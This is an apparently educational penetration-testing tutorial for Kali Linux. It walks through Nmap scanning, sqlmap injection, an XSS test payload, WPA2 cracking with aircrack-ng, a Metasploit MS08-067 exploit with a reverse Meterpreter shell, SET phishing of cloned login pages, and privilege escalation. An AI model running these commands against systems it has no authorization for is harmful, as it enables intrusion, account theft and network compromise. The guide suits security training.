# **Penetration Testing Examples Using Kali Linux**

Penetration testing (pen testing) is a type of security testing where security professionals simulate attacks to identify vulnerabilities in systems, networks, or applications. Kali Linux is an excellent tool for penetration testers due to its comprehensive set of pre-installed security tools.

Here are several **real-world examples** of penetration testing tasks using Kali Linux:

---

### **1. Network Penetration Testing (Nmap)**

**Nmap (Network Mapper)** is one of the most widely used tools in penetration testing for network discovery and vulnerability scanning.

#### **Example: Network Scanning to Identify Active Hosts**

**Goal**: Discover which devices are connected to a network.

**Steps**:
1. **Network Discovery**: Use **Nmap** to scan the target network range to identify active hosts.
   
   ```bash
   nmap -sP 192.168.1.0/24
   ```

   - `-sP`: Performs a **ping sweep** to detect live hosts.
   - `192.168.1.0/24`: The subnet range to scan.

2. **Result**: Nmap will return a list of IP addresses and device names of active hosts on the network.

---

#### **Example: Port Scanning and Service Detection**

**Goal**: Identify open ports and services running on a specific host to check for vulnerabilities.

**Steps**:
1. **Port Scanning**: Use Nmap to scan open ports and services on a target host.

   ```bash
   nmap -p 1-65535 -T4 -A 192.168.1.100
   ```

   - `-p 1-65535`: Scans all 65,535 ports.
   - `-T4`: Increases the speed of the scan.
   - `-A`: Enables OS detection, version detection, script scanning, and traceroute.

2. **Result**: Nmap will list all open ports, the services running on those ports, and attempt to identify the operating system.

---

### **2. Web Application Penetration Testing**

Penetration testers often assess web applications for common vulnerabilities such as **SQL injection**, **Cross-Site Scripting (XSS)**, and **Cross-Site Request Forgery (CSRF)**.

#### **Example: Scanning for SQL Injection Vulnerabilities with SQLmap**

**Goal**: Identify and exploit **SQL injection** vulnerabilities in a web application.

**Steps**:
1. **Identify the Vulnerability**: Use **SQLmap** to test for SQL injection vulnerabilities in a website.
   
   ```bash
   sqlmap -u "http://example.com/login.php?user=test&pass=test" --dbs
   ```

   - `-u`: Specifies the URL with the vulnerable parameter.
   - `--dbs`: Tells SQLmap to enumerate the databases.

2. **Exploit the Vulnerability**: If a vulnerability is found, SQLmap will attempt to extract the database schema, tables, and data from the database.

3. **Result**: If successful, SQLmap will return a list of databases, tables, and potentially sensitive data such as usernames and passwords.

---

#### **Example: Cross-Site Scripting (XSS) Testing with Burp Suite**

**Goal**: Identify **XSS vulnerabilities** in a web application.

**Steps**:
1. **Intercept Requests with Burp Suite**: Set up Burp Suite as a proxy and intercept HTTP requests between the browser and the web server.
   
   - Configure your browser to use Burp Suite as a proxy server.
   - Use Burp Suite's **Intercept** tab to capture web traffic.

2. **Inject Malicious Payload**: In the request, inject an XSS payload (e.g., `<script>alert('XSS')</script>`), and forward the modified request to the server.

3. **Check for XSS**: If the application reflects the payload back in the response without proper sanitization, an alert box will pop up, indicating that the site is vulnerable to **Reflected XSS**.

4. **Result**: If the alert box appears, it means the site is vulnerable to XSS, and the attacker could potentially inject malicious scripts to steal user data or perform other malicious actions.

---

### **3. Wireless Network Penetration Testing**

Wireless network penetration testing is performed to assess the security of Wi-Fi networks and identify weaknesses such as **WEP/WPA2 vulnerabilities**.

#### **Example: Cracking WPA2 Password Using Aircrack-ng**

**Goal**: Crack the **WPA2** password of a Wi-Fi network using **Aircrack-ng**.

**Steps**:
1. **Capture WPA2 Handshake**: Use **airodump-ng** to capture the WPA2 handshake when a client connects to the target Wi-Fi network.

   ```bash
   airodump-ng --bssid <target-AP-MAC> -c <channel> --write handshake wlan0mon
   ```

   - `--bssid`: The MAC address of the target access point.
   - `-c`: The channel the target access point is operating on.
   - `--write handshake`: Save the captured handshake to a file.

2. **Crack WPA2 Password**: Once the handshake is captured, use **Aircrack-ng** to crack the password with a wordlist.

   ```bash
   aircrack-ng handshake.cap -w /path/to/wordlist.txt
   ```

3. **Result**: If the password is found in the wordlist, Aircrack-ng will display it. The WPA2 key will allow access to the wireless network.

---

### **4. Exploiting Vulnerabilities**

Penetration testers often exploit identified vulnerabilities to gain access to systems.

#### **Example: Exploiting a Vulnerable Service with Metasploit**

**Goal**: Exploit a known vulnerability in a service (e.g., **MS08-067**, a vulnerability in Microsoft Windows SMB) using **Metasploit**.

**Steps**:
1. **Search for Exploit**: Open **Metasploit** and search for the exploit for the MS08-067 vulnerability.

   ```bash
   search ms08_067
   ```

2. **Use the Exploit**: Once the exploit is found, configure it with the target’s IP address.

   ```bash
   use exploit/windows/smb/ms08_067_netapi
   set RHOST 192.168.1.100
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST 192.168.1.10
   exploit
   ```

   - `RHOST`: The target system’s IP address.
   - `LHOST`: Your local IP address to receive the reverse connection.

3. **Access the Target**: If successful, Metasploit will establish a **Meterpreter** session, allowing you to execute commands and control the target system.

4. **Result**: You gain access to the target system and can conduct further activities, such as data exfiltration, privilege escalation, or maintaining persistence.

---

### **5. Social Engineering**

Penetration testers also test how easily users can be manipulated into compromising security, such as through phishing or other social engineering tactics.

#### **Example: Phishing Attack Using the Social-Engineer Toolkit (SET)**

**Goal**: Launch a **phishing attack** to capture login credentials using the **Social-Engineer Toolkit (SET)**.

**Steps**:
1. **Launch SET**: Start SET and choose the **“Social-Engineering Attacks”** option.

   ```bash
   setoolkit
   ```

2. **Choose Attack Type**: Select the **“Phishing”** attack vector. SET will allow you to clone a legitimate website (such as a login page) to create a phishing page.

3. **Configure the Attack**: Provide the **URL** of the website you want to spoof (e.g., Facebook or Gmail login page). SET will clone the site and create a **fake login page**.
   
4. **Send the Phishing Link**: Set up an email or message with the phishing link and send it to the target. Once the target logs in, their credentials are captured.

5. **Result**: The attacker can now view the victim’s login credentials, allowing them to gain unauthorized access to accounts or systems.

---

### **6. Privilege Escalation**

After gaining access to a system, penetration testers often attempt **privilege escalation** to gain higher levels of access (e.g., root or administrator privileges).

#### **Example: Privilege Escalation with Linux Exploit Suggester**

**Goal**: Identify potential privilege escalation vectors on a compromised Linux system.

**Steps**:
1. **Gain Access**: Once you have low-level access (e.g., as a regular user) to a Linux system, use tools like **Netcat** or **SSH** to gain a shell.
2. **Run Linux Exploit Suggester**: Use **Linux Exploit Suggester** to find potential vulnerabilities that could be exploited to escalate privileges.

   ```bash
   python linux-exploit-suggester.py
   ```

3. **Exploit Vulnerabilities**: If any known vulnerabilities are found (e.g., outdated kernel versions or misconfigurations), exploit them to escalate privileges.

4. **Result**: Gain root access to the system, allowing you to execute commands as a superuser and gain full control of the system.

---

### **Conclusion**

Penetration testing is a key activity in cybersecurity, allowing professionals to identify and fix vulnerabilities before malicious actors can exploit them. **Kali Linux** is an essential toolset for penetration testers, providing **over 600 pre-installed tools** for tasks such as **network discovery**, **web application testing**, **password cracking**, and **exploit development**.

Examples in Kali Linux, like using **Nmap** for scanning, **Metasploit** for exploitation, **Burp Suite** for web application testing, and **Aircrack-ng** for wireless network penetration, showcase the practical steps to assess security.

Remember that **ethical hacking** should always be conducted with **permission** from the target system owner, and you should be aware of the legal implications of your actions.